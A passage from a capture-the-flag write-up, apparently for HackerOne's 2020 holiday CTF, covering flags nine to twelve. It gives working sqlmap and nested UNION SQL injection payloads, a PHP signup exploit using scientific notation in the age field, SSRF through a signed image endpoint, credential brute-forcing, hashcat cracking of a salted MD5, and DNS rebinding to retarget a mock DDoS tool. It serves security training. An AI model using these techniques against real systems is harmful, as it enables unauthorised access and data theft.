Basically, we tell sqlmap to inject through the `name` parameter and then check the URL supplied through `--second-url` for results, using the string ` 0 other` as the string to look for to determine a `false` response. Anything else will be regarded as a `true`response. sqlmap will also ask whether to follow redirects and if it should merge cookies -  answering no is the right way to go.

Quite a few 502s and 500s later, sqlmap finally reports that there are two tables in a database named `quiz`:
```bash
[09:33:59] [INFO] retrieved: quiz
Database: quiz
[2 tables]
+-------+
| admin |
| quiz  |
+-------+
```

Not really interested in the actual quiz anymore, let's have a look at the contents of `admin` by adding the switches `-D quiz -T admin` :
```bash
Database: quiz
Table: admin
[1 entry]
+----+-------------------+----------+
| id | password          | username |
+----+-------------------+----------+
| 1  | S3creT_p4ssw0rd-$ | admin    |
+----+-------------------+----------+
```

Entering our credentials into the login box for the admin section at https://hackyholidays.h1ctf.com/evil-quiz/admin, we are greeted with the ninth flag `flag{6e8a2df4-5b14-400f-a85a-08a260b59135}`:

{F1138519}


## /signup-manager - the tenth flag
Oh no, the Grinch is trying to recruit people who hate Christmas! (who signs up for this?! ... oh right, I did). 
{F1138520}

Anyway, signing up with a random user doesn't give us much:
{F1138521}

Checking for SQLi, XSS etc again gives nothing - not even XXE works. Shoot. Ah well, let's have a look at the source code, then.

{F1138522}
?!
Surely, the Grinch wouldn't have forgotten the README.md file in place? Must. Check. 
(https://hackyholidays.h1ctf.com/signup-manager/README.md)
```
# SignUp Manager

SignUp manager is a simple and easy to use script which allows new users to signup and login to a private page. All users are stored in a file so need for a complicated database setup.

### How to Install

1) Create a directory that you wish SignUp Manager to be installed into

2) Move signupmanager.zip into the new directory and unzip it.

3) For security move users.txt into a directory that cannot be read from website visitors

4) Update index.php with the location of your users.txt file

5) Edit the user and admin php files to display your hidden content

6) You can make anyone an admin by changing the last character in the users.txt file to a Y

7) Default login is admin / password
```

Turns out, he did leave it in place - and it has credentials! It also tells us all users are saved to a textfile and that the very last character for each user's entry in `users.txt` determines whether they are an admin or not - `Y` for admin, otherwise `N`.
However, the default credentials `admin:password` do not work. Maybe the `users.txt` file has also been left in place?
{F1138524}

Nope... What about the source code then, supposedly contained in `signupmanager.zip`? It is indeed available to us and contains the following files:
(https://hackyholidays.h1ctf.com/signup-manager/signupmanager.zip)
{F1138523}

`admin.php` seems interesting  but doesn't actually have anything of value for us. Looking through the rest of the files, it quickly becomes evident that only `index.php` is of any interest to us. In particular, it has all the code for the sign up process and explicitly pads the string to be saved in `users.txt` to a fixed length and ensures the last letter will be `N` to deprive us of admin privileges. The relevant code for adding users is:
```php
function addUser($username,$password,$age,$firstname,$lastname){
    $random_hash = md5( print_r($_SERVER,true).print_r($_POST,true).date("U").microtime().rand() );
    $line = '';
    $line .= str_pad( $username,15,"#");
    $line .= $password;
    $line .= $random_hash;
    $line .= str_pad( $age,3,"#");
    $line .= str_pad( $firstname,15,"#");
    $line .= str_pad( $lastname,15,"#");
    $line .= 'N';
    $line = substr($line,0,113);
    file_put_contents('users.txt',$line.PHP_EOL, FILE_APPEND);
    return $random_hash;
}
[...]
if ($_POST["action"] == 'signup' && isset($_POST["username"], $_POST["password"], $_POST["age"], $_POST["firstname"], $_POST["lastname"])) {
            $username = substr(preg_replace('/([^a-zA-Z0-9])/', '', $_POST["username"]), 0, 15);
            if (strlen($username) < 3) {
                $errors[] = 'Username must by at least 3 characters';
            } else {
                if (isset($all_users[$username])) {
                    $errors[] = 'Username already exists';
                }
            }
            $password = md5($_POST["password"]);
            $firstname = substr(preg_replace('/([^a-zA-Z0-9])/', '', $_POST["firstname"]), 0, 15);
            if (strlen($firstname) < 3) {
                $errors[] = 'First name must by at least 3 characters';
            }
            $lastname = substr(preg_replace('/([^a-zA-Z0-9])/', '', $_POST["lastname"]), 0, 15);
            if (strlen($lastname) < 3) {
                $errors[] = 'Last name must by at least 3 characters';
            }
            if (!is_numeric($_POST["age"])) {
                $errors[] = 'Age entered is invalid';
            }
            if (strlen($_POST["age"]) > 3) {
                $errors[] = 'Age entered is too long';
            }
            $age = intval($_POST["age"]);
            if (count($errors) === 0) {
                $cookie = addUser($username, $password, $age, $firstname, $lastname);
                setcookie('token', $cookie, time() + 3600);
                header("Location: " . explode("?", $_SERVER["REQUEST_URI"])[0]);
                exit();
            }
        }
```

At first sight, there doesn't seem to be any way to coerce the application into giving us admin privileges - all inputs are being forced to specific lengths by either `substr` (`username`, `firstname`, `lastname`) followed by `str_pad`, by MD5 hashing (`password`), or by simple `strlen`check (`age`).

The `addUser` function then ensures fixed length so that the final string entered into `users.txt` is exactly 113 in length. There is just one parameter that sticks out here - `age`.

While the page certainly ensures it is no longer than 3 in length, computers in general allow for expansion by using `e` notation - `1e3` will become `1000`. PHP's `is_numeric` accepts this notation and it will later be expanded past the imposed length limit.

Knowing this, we can craft the following POST data in Burp and POST it to `https://hackyholidays.h1ctf.com/signup-manager/`:
```http
action=signup&
username=ayayay&
password=ayayay&
age=1e3&
firstname=ayayay&
lastname=YYYYYYYYYYYYYYY
```
{F1138617}

Do note, `lastname`'s 15th character must be an uppercase `Y`. The `1e3` will expand into `1000` thus making the final string to enter `users.txt`:
`ayayay#########8f74d2d878f454edb5dd310d198af797c4ca4238a0b923820dcc509a6f75849b1000ayayay#########YYYYYYYYYYYYYYY` (or similar - the hash for session will differ)

This creates an admin user for us and when we log in with the above credentials, we will be greeted by the following screen and the tenth flag `flag{99309f0f-1752-44a5-af1e-a03e4150757d}`:
{F1138528}

We also receive a link to our next task - the 11th flag!

## r3c0n_server_4fdk59/ - the 11th flag
Turns out the Grinch has been doing 'recon' on Santa's activities since 2018 and uploaded evidence of his criminal conduct to the internet. Tsk tsk.

{F1138529}

The album links lead to pages with photos:
{F1138531}

The first page tells us there is an API in development but not much more. Fuzzing the url `https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/` doesn't really much except confirming there is, in fact, an endpoint under `api/`:
```bash
ffuf -u https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/FUZZ -w /usr/share/seclists/Discovery/Web-Content/common.txt

api/experiments         [Status: 401, Size: 64, Words: 9, Lines: 1] (false positive, hurr)
api                     [Status: 200, Size: 2390, Words: 888, Lines: 54]
picture                 [Status: 200, Size: 21, Words: 3, Lines: 1]
uploads                 [Status: 403, Size: 145, Words: 3, Lines: 7]
```
{F1138530}

It tells us there are a bunch of status codes but not much else... Fuzzing `r3c0n_server_4fdk59/api/` gives us a whole lot of 401s - literally anything is a 401 under `api/` -  and just about nothing else... Well, it does tell us it's probably because we are coming from the wrong IP, so let's see if we can find some SSRF or other vulnerabilities.

Just for the sake of it, let's also run sqlmap on whatever we find.

Inspecting the first page with the album links tells us they point to `album?hash=HASHVALUE` [example](https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/album?hash=jdh34k)

Trying to decode the hashes gave nothing, so let's go ahead with sqlmap:
```bash
sqlmap -u https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/album?hash=jdh34k --dbs
[...]
[14:52:35] [INFO] fetching database names
available databases [2]:
[*] information_schema
[*] recon
```

So it's vulnerable, let's enumerate the `recon` database:
```bash
sqlmap -u https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/album?hash=jdh34k -D recon --tables
[...]
[14:53:50] [INFO] fetching tables for database: 'recon'
Database: recon
[2 tables]
+-------+
| album |
| photo |
+-------+
```

Dumping them gives the following information:
```mysql
Database: recon
Table: album
[3 entries]
+----+--------+-----------+
| id | hash   | name      |
+----+--------+-----------+
| 1  | 3dir42 | Xmas 2018 |
| 2  | 59grop | Xmas 2019 |
| 3  | jdh34k | Xmas 2020 |
+----+--------+-----------+

Database: recon
Table: photo
[6 entries]
+----+----------+--------------------------------------+
| id | album_id | photo                                |
+----+----------+--------------------------------------+
| 1  | 1        | 0a382c6177b04386e1a45ceeaa812e4e.jpg |
| 2  | 1        | 1254314b8292b8f790862d63fa5dce8f.jpg |
| 3  | 2        | 32febb19572b12435a6a390c08e8d3da.jpg |
| 4  | 3        | db507bdb186d33a719eb045603020cec.jpg |
| 5  | 3        | 9b881af8b32ff07f6daada95ff70dc3a.jpg |
| 6  | 3        | 13d74554c30e1069714a5a9edda8c94d.jpg |
+----+----------+--------------------------------------+
```

Hmm, nothing really interesting here. Let's have a look at how pictures are loaded.

https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/picture?data=eyJpbWFnZSI6InIzYzBuX3NlcnZlcl80ZmRrNTlcL3VwbG9hZHNcLzliODgxYWY4YjMyZmYwN2Y2ZGFhZGE5NWZmNzBkYzNhLmpwZyIsImF1dGgiOiJlOTM0ZjQ0MDdhOWRmOWZkMjcyY2RiOWMzOTdmNjczZiJ9

Now that's more interesting! While the `picture` endpoint's `data` parameter doesn't seem to be vulnerable to SQLi, its contents look base64 encoded:
```javascript
atob(`eyJpbWFnZSI6InIzYzBuX3NlcnZlcl80ZmRrNTlcL3VwbG9hZHNcLzliODgxYWY4YjMyZmYwN2Y2ZGFhZGE5NWZmNzBkYzNhLmpwZyIsImF1dGgiOiJlOTM0ZjQ0MDdhOWRmOWZkMjcyY2RiOWMzOTdmNjczZiJ9`);
```
```json
{
  "image":"r3c0n_server_4fdk59\/uploads\/9b881af8b32ff07f6daada95ff70dc3a.jpg",
  "auth":"e934f4407a9df9fd272cdb9c397f673f"
}
```

Sweet, looks like there might be some sort of SSRF and a leaked auth-hash! Also, we know uploaded pictures go in `uploads/`. Let's try to access some really common API endpoint, like `api/user`, right away!
```javascript
let e = btoa('{"image":"r3c0n_server_4fdk59\/api\/user","auth":"e934f4407a9df9fd272cdb9c397f673f"}');
fetch(`/r3c0n_server_4fdk59/picture?data=${e}`).then(d => d.text()).then(d => console.log(d));
```
Wonder what nice stuff we'll get back now!
```text
invalid authentication hash
```
... I should have known. Seems like the `auth` part of the JSON object is used to check the contents of `image`. We can add any arbitrary properties we'd like to the JSON object, and as long as we don't fiddle with `image` and `auth`, the `/picture` endpoint will happily  accept it.

\* **Several days of trying to figure out how the `auth` hash is encoded, hashed, encrypted etc later** *

I got ... nothing. Let's go over the SQLi on the `hash` param - maybe we can influence the pictures displayed... 

Looking back at the album and photo tables, the query is likely to select three columns so let's try with a UNION attack and see if we can get photos from 2020 without using the hash `jdh34k`. Since we know the album id is `3`, we can construct the following  SQLi:

```javascript
sql = `' union all select "3", 3, 'test' -- `;
encodeURI(`https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/album?hash=${sql}`);
```
Gives us this link https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/album?hash='%20union%20all%20select%20%223%22,%203,%20'test'%20--%20 resulting in this page:
{F1138533}

Yup, we can fetch whatever album we'd like without using the hash. So what?

\* **Several hours spent trying to find ways to priv esc the database or random files through `uploads/` later** *

Back to the SQLi again. Maybe we can do a double union? I mean, we have found nothing else, and it's definitely fetching the pictures out of the database before displaying them. Let's see if we can construct an SQLi on the album id fetched from the database and affect the photo filename, the third column, loaded out of photos when the album page goes to load those from the DB:
```javascript
// this query assumes the /album first fetches the album id using hash
// and then plugs that album id into a query to fetch any relevant photos
// ie, the photo query's where statement becomes `album_id = 3' union select all 1, 2, 'waffle --
// this in turn will give us another row fetched where the photo url will include waffle
sql = `' union all select "3' union all select 1, 2, 'waffle -- ' -- ", 3, 'test' -- `;
encodeURI(`https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/album?hash=${sql}`);
```
Gives us this link https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/album?hash='%20union%20all%20select%20%223'%20union%20all%20select%201,%202,%20'waffle%20--%20'%20--%20%22,%203,%20'test'%20--%20 which includes a picture that can't be displayed!

Opening the link directly results in this:

{F1138535}

The missing image link's data payload decodes to:
```javascript
atob("eyJpbWFnZSI6InIzYzBuX3NlcnZlcl80ZmRrNTlcL3VwbG9hZHNcL3dhZmZsZSAtLSAiLCJhdXRoIjoiNGYwNzdlYjJhZDJmYzI3Y2Q5ZGVlMmJmZGE3NjNiZDcifQ==");
"{
  "image":"r3c0n_server_4fdk59\/uploads\/waffle -- ",
  "auth":"4f077eb2ad2fc27cd9dee2bfda763bd7"
}"
```

Following the [link](https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/picture?data=eyJpbWFnZSI6InIzYzBuX3NlcnZlcl80ZmRrNTlcL3VwbG9hZHNcL3dhZmZsZSAtLSAiLCJhdXRoIjoiNGYwNzdlYjJhZDJmYzI3Y2Q5ZGVlMmJmZGE3NjNiZDcifQ==), we are presented with the following message:

{F1138534}

Since it isn't a raw 404, it looks like `picture` really tried to read `waffle` from uploads. Apparently, the server has calculated the `auth` property for us and we have successfully achieved SSRF! Using the same method, let's see if we can access the API now by trying `api/user` again:
```javascript
sql = `' union all select "3' union all select 1, 2, '../api/user' -- ", 3, 'test' -- `;
encodeURI(`https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/album?hash=${sql}`);
```
[Resulting link](https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/album?hash='%20union%20all%20select%20%223'%20union%20all%20select%201,%202,%20'../api/user'%20--%20%22,%203,%20'test'%20--%20)
[Image link](https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/picture?data=eyJpbWFnZSI6InIzYzBuX3NlcnZlcl80ZmRrNTlcL3VwbG9hZHNcLy4uXC9hcGlcL3VzZXIiLCJhdXRoIjoiYmZiNmRkMDRlNjZlODU1NjRkZWJiYTNlN2IyMjJlMzQifQ==)
{F1138662}

Nope. Perhaps we need to specify a user? Let's try appending `?id=1`

```javascript
sql = `' union all select "3' union all select 1, 2, '../api/user?id=1' -- ", 3, 'test' -- `;
encodeURI(`https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/album?hash=${sql}`);
```
[Resulting link](https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/album?hash='%20union%20all%20select%20%223'%20union%20all%20select%201,%202,%20'../api/user?id=1'%20--%20%22,%203,%20'test'%20--%20)
[Image link](https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/picture?data=eyJpbWFnZSI6InIzYzBuX3NlcnZlcl80ZmRrNTlcL3VwbG9hZHNcLy4uXC9hcGlcL3VzZXI/aWQ9MSIsImF1dGgiOiI5ODZhNDA5ODY3ZDljYmVlOTVmZDg1MDFmYmEwMTFmMyJ9)
{F1138536}

Referencing the previous table for API status codes, `id` apparently isn't valid. Bah, let's fuzz it. 

\* **Several hours of intense script writing later** *

Armed with a node.js script, we can now automate visiting links and gathering data, thus enabling fuzzing. The script is nothing fancy and is basically the previously mentioned encoding combined with fetch, accessible from the command line for ease of use.

Fuzzing for parameters, I find that the `user` endpoint accepts `username` and `password` (and `0`, which in hindsight probably is just the start of some other parameter I didn't find).

\* **Several hours spent passionately trying to brute-force `username` and `password` later** *

Empty handed, I start looking for other endpoints and discover two more by fuzzing: `ping` and `sleep`. Both return `Invalid content type` when accessed through `picture` payloads. Huh. Normally at least the `ping` endpoint would return data - maybe the `picture` endpoint expects actual image data? None the wiser, I again go back through the recon challenge, checking for missed things. Not sure exactly why, but for some reason, my mind gets stuck on SQLi. Since we have already had two layers of SQLi, maybe there's another? Maybe we can extract a user by shoving a `%` in the `username` parameter, combining it with the error message (invalid content type) from `picture`? Might as well try!

Change the user part of the SQLi to `user?username=%` and generate the links like before:
[Resulting link](https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/album?hash=%27%20union%20all%20select%20%223%27%20union%20all%20select%201,%202,%20%27../api/user?username=%25%27%20--%20%22,%203,%20%27test%27%20--%20)
[Image link](https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/picture?data=eyJpbWFnZSI6InIzYzBuX3NlcnZlcl80ZmRrNTlcL3VwbG9hZHNcLy4uXC9hcGlcL3VzZXI/dXNlcm5hbWU9JSIsImF1dGgiOiIzYjZkNmVmOGRkN2JiNzUxZmI1ZTIwMDJhOGRhZDdhMSJ9)
{F1138662}
If there is another SQLi, this is definitely in line with how `ping` behaves - maybe we can use it as a boolean and extract the username? Let's try `a%`:
`Expected HTTP status 200, Received: 204`
{F1138667}
[same procedure for b-f, all resulting in "Received: 204"]
`g%`:
{F1138662}
Oh, looks like it is usable and the first letter of username is a lowercase `g`!

\* **Intense script writing resumes - adding username and password brute-forcing to the script** *

Letting the script run, it finally discovers that the `username` is likely to be `grinchadmin` and the password `s4nt4sucks`.

Plugging these into the login box at `https://hackyholidays.h1ctf.com/attack-box/` leads us to this page and the 11th flag `flag{07a03135-9778-4dee-a83c-7ec330728e72}`:
{F1138538}

At long last, the 11th flag! But wait, the Grinch is going to DDoS Santa's servers (as we know) and his underlings have finished preparing the target setup!

## attack-box/ - the 12th and final flag
Ooooookay, we need to stop this now. Before it's too late (hey, those buttons...). Need to protect Christmas (they look kinda nice)! 

Maybe... No... I must click them!

{F1138539}

Sorry Santa! Fortunately, it seems Santa's infrastructure isn't so easily overpowered (phew!).

So, how to go about this then... As one would guess, fuzzing gives nothing! Yup. No surprises there, not even coal. Let's have another look at those buttons (no touching!).

https://hackyholidays.h1ctf.com/attack-box/launch?payload=eyJ0YXJnZXQiOiIyMDMuMC4xMTMuMzMiLCJoYXNoIjoiNWYyOTQwZDY1Y2E0MTQwY2MxOGQwODc4YmMzOTg5NTUifQ==

Apparently, they point to `launch` which accepts a base64 string through the `payload` parameter. Decoding the parameter gives us the following object:
```javascript
atob('eyJ0YXJnZXQiOiIyMDMuMC4xMTMuMzMiLCJoYXNoIjoiNWYyOTQwZDY1Y2E0MTQwY2MxOGQwODc4YmMzOTg5NTUifQ==');
```
```json
{
  "target":"203.0.113.33",
  "hash":"5f2940d65ca4140cc18d0878bc398955"
}
```

Great, another payload with another authentication hash. Maybe we can crack this one? Enter hashcat!
```hashcat
Session..........: hashcat
Status...........: Cracked
Hash.Name........: md5($pass.$salt)
Hash.Target......: 5f2940d65ca4140cc18d0878bc398955:203.0.113.33
Time.Started.....: Tue Dec 29 22:44:30 2020 (0 secs)
Time.Estimated...: Tue Dec 29 22:44:30 2020 (0 secs)
Guess.Base.......: File (..\h1-xmas-ctf\rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........: 17556.6 kH/s (5.91ms) @ Accel:1024 Loops:1 Thr:64 Vec:1
Recovered........: 1/1 (100.00%) Digests
Progress.........: 5898240/14344385 (41.12%)
Rejected.........: 0/5898240 (0.00%)
Restore.Point....: 4915200/14344385 (34.27%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidates.#1....: omarsnork -> madruboisvert55
Hardware.Mon.#1..: Temp: 41c Fan:  0% Util: 30% Core:1632MHz Mem:3802MHz Bus:16
```

Apparently, yes, yes we can.
Success was achieved first try by formatting a text file named `hash2.txt` like so:
``` 
5f2940d65ca4140cc18d0878bc398955:203.0.113.33
```
(curse you, `hash.txt`)

Then, we run hashcat like so:
```powershell
.\hashcat.exe -m 10 -a 0 .\hash2.txt ..\h1-xmas-ctf\rockyou.txt
```

The `hash2.txt` format along with options `-m 10 -a 0` tells hashcat to try to turn the ip `203.0.113.33` into the hash `5f2940d65ca4140cc18d0878bc398955` by using a line from `rockyou.txt` and stuffing them together like so: `md5(LINEFROMROCKYOU . '203.0.113.33')`.

We are quickly informed that the salt (pepper, actually) is `mrgrinch463`. Nice!

Using this, let's try our hand at creating a custom payload and see if we can change what the DDoS script attacks.

First, let's insert an IFRAME into the `attack-box` and give it the id `frame` - this way we can easily monitor what goes on in real time. I did this by opening the inspector and editing the first DIV inside the DIV with class `container`, though anywhere on the webpage should do.

{F1138540}

Next, I entered this little snippet into the console:

```javascript
// copy and paste md5 from here http://www.myersdaily.org/joseph/javascript/md5.js into the console
let lo = (load) => {
    load = decodeURIComponent(load);
    console.log("Running", load);
    const hash = md5(`mrgrinch463${load}`);
    const tar = `/attack-box/launch?payload=${btoa(`{"target":"${load}","hash":"${hash}"}`)}`;
    document.getElementById("frame").src = tar;
}
```

This let's us easily construct a new payload and load it into the IFRAME. 

Let's try it with google as the target:

```javascript
lo("google.com");
```

{F1138542}

Ah yes, we can create custom payloads with any target we'd like! (sorry google). Let's shut down `localhost`!

```javascript
lo("localhost");
```

{F1138543}

...
Same thing for `127.0.0.1`, `hackyholidays.h1ctf.com`, and so on. So there's some kind of protection for local targets in place... Hmm.

Running another domain, I noticed there was a slight delay between
```
Getting Host information for: test.com
Host resolves to x.x.x.x
```
and
```
Spinning up botnet
Launching attack against: ...
```

Just a few seconds, but probably enough time to perform a DNS Rebinding attack.

Let's do it!
I control my own domain, but it won't let me set the TTL to anything lower than 600 seconds, so the code below will reflect that.

First up, create a custom subdomain like `hacky.example.com` on a domain you own or through any service that lets you control TTL and destination. Point it to any IP that isn't `18.216.153.32`, the IP of the CTF (and the Grinch's server). Set the TTL to 600 seconds.

Next, run a request against `hacky.example.com` and at the same time, initiate a timer to run a *second* request 598 seconds later (big maths incorporating load times, the alignment of the stars and what not).
```javascript
setTimeout(() => { lo("hacky.example.com") }, 598000);
lo("hacky.example.com");
```

While waiting for the timer to run its course, leisurely change the DNS pointer for `hacky.example.com` to point to `127.0.0.1` and then grab a coffee or something. Take your time, brew it properly. Or a nice, warm cup of tea, as the Spiffing Brit would recommend. You might also take a moment to ponder what choices in life has led you to this point.

Once the timer is done, you will (hopefully) be greeted by this:
{F1138544}

The 12th, and final, flag is `flag{ba6586b0-e482-41e6-9a68-caf9941b48a0}`. The Grinch's server is down, Christmas has been saved, I get no coal, and maybe, just maybe, I can get that Snow Ball Launcher.

#Shout outs

Big thanks to HackerOne, Adam, Naham for this CTF - looking forward to the next one!

Also shout outs to the people of HackerOne's discord who were very kind and helpful with hints and nudges for those of us stuck! I hope I can return the favour some day!

## Impact

Lots of vulns!

## Attachments
- Pasted_image_20201229091901.png
- Pasted_image_20201229091618.png
- Pasted_image_20201229092052.png
- Pasted_image_20201229110046.png
- Pasted_image_20201229110100.png
- Pasted_image_20201229112917.png
- Pasted_image_20201229115149.png
- Pasted_image_20201229112949.png
- Pasted_image_20201229115250.png
- Pasted_image_20201229115500.png
- Pasted_image_20201229115737.png
- Pasted_image_20201229120110.png
- Pasted_image_20201229120345.png
- Pasted_image_20201229120346.png
- Pasted_image_20201229120540.png
- Pasted_image_20201229120430.png
- Pasted_image_20201229120635.png
- Pasted_image_20201229121123.png
- Pasted_image_20201229120756.png
- Pasted_image_20201229121411.png
- Pasted_image_20201229121452.png
- Pasted_image_20201229122354.png
- Pasted_image_20201229122536.png
- Pasted_image_20201229122743.png
- Pasted_image_20201229122652.png
- Pasted_image_20201229122822.png
- Pasted_image_20201229122943.png
- Pasted_image_20201229123918.png
- Pasted_image_20201229124202.png
- Pasted_image_20201229124223.png
- Pasted_image_20201229130106.png
- Pasted_image_20201229130041.png
- Pasted_image_20201229130239.png
- Pasted_image_20201229130532.png
- Pasted_image_20201229131113.png
- Pasted_image_20201229131136.png
- Pasted_image_20201229133606.png
- Pasted_image_20201229133649.png
- Pasted_image_20201229133803.png
- Pasted_image_20201229134124.png
- Pasted_image_20201229134513.png
- Pasted_image_20201229134553.png
- Pasted_image_20201229134720.png
- Pasted_image_20201229134832.png
- Pasted_image_20201229134852.png
- Pasted_image_20201230144430.png
- Pasted_image_20201230144848.png
- Pasted_image_20201230144955.png
- Pasted_image_20201230150157.png
- Pasted_image_20201230150311.png
- Pasted_image_20201230150602.png
- Pasted_image_20201230150700.png
- Pasted_image_20201230151007.png
- Pasted_image_20201230150858.png
- Pasted_image_20201230154008.png
- Pasted_image_20201230154009.png
- Pasted_image_20201230154012.png
- Pasted_image_20201230154557.png
- Pasted_image_20201230154803.png
- Pasted_image_20201230154633.png
- Pasted_image_20201230154822.png
- Pasted_image_20201230161154.png
- Pasted_image_20201230161840.png
- Pasted_image_20201230161725.png
- Pasted_image_20201230162643.png
- Pasted_image_20201230162517.png
- Pasted_image_20201230165816.png
- Pasted_image_20201230170138.png
- Pasted_image_20201230171710.png
- Pasted_image_20201230171834.png
- Pasted_image_20201230171933.png
- Pasted_image_20201230172116.png
- Pasted_image_20201230172713.png
- burpsignup.png
- invalidcontenttype.png
- 204error.png
